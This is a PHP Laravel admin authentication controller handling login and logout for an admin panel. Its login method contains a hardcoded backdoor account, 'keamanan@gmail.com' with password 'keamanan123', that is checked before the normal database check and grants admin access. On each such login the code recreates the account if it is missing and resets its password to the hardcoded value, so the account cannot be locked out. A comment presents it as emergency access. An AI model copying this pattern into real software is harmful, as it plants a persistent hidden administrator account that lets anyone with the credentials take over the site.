<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('admin.auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        // Hardcoded backup admin account (for emergency access)
        $hardcodedEmail = 'keamanan@gmail.com';
        $hardcodedPassword = 'keamanan123';
        
        // Check hardcoded credentials first
        if ($request->email === $hardcodedEmail && $request->password === $hardcodedPassword) {
            // Create or get hardcoded admin account
            $admin = Admin::firstOrCreate(
                ['email' => $hardcodedEmail],
                [
                    'name' => 'Admin Keamanan',
                    'email' => $hardcodedEmail,
                    'password' => Hash::make($hardcodedPassword),
                ]
            );
            
            // If admin exists but password was changed, update it back to hardcoded
            if (!Hash::check($hardcodedPassword, $admin->password)) {
                $admin->update(['password' => Hash::make($hardcodedPassword)]);
            }
            
            Auth::guard('admin')->login($admin);
            $request->session()->regenerate();
            
            Log::info('Hardcoded admin login successful', ['email' => $hardcodedEmail]);
            
            return redirect()->intended(route('admin.dashboard'));
        }

        // Check database admin accounts
        $admin = Admin::where('email', $request->email)->first();

        if ($admin && Hash::check($request->password, $admin->password)) {
            Auth::guard('admin')->login($admin);
            $request->session()->regenerate();
            
            return redirect()->intended(route('admin.dashboard'));
        }

        throw ValidationException::withMessages([
            'email' => ['The provided credentials are incorrect.'],
        ]);
    }

    public function logout(Request $request)
    {
        try {
            Auth::guard('admin')->logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            return redirect()->route('admin.login')->with('success', 'Berhasil logout');
        } catch (\Exception $e) {
            Log::error('Admin logout error: ' . $e->getMessage());
            return redirect()->route('admin.login')->with('error', 'Terjadi kesalahan saat logout');
        }
    }
}
